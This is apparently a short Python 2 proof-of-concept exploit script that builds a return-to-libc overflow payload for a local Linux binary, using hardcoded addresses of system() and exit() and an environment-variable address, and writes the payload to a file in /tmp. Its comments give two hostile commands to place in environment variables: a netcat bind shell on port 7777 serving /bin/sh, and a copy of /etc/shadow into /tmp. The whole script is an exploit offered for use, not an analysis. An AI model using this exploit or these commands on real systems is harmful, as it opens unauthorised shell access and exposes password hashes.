#This is ret2sys poc, local exploitation method using environment variable 
#DEP is on and ASLR is off 
#You can check linux binary protection mechanism using checksec.sh 
import struct 
import sys 

buffer = "A" * 20 

#system func address in glibc 
sys_retn = struct.pack('<L',0x41061170)

# export NC="nc.traditional -l -p 7777 -e /bin/sh" 
# ./env NC  (0xbffff669) this value varies on your environment variable length & adjust this 
#export PW="cat /etc/shadow > /tmp/shadow" 
# ./env PW (0xbffffdc0) this value varies on your envrionment variable length & adjust this.
sys_arg = struct.pack('<L',0xbffffdc0)

# exit func address in glibc 
exit_func = struct.pack('<L',0x41056fc0)

buffer += sys_retn + exit_func + sys_arg 

filename = "/tmp/passlibc_input" 
f = open(filename,'w')
f.write(buffer)
f.close() 
print "Successfully " + filename + " Created!!!" 

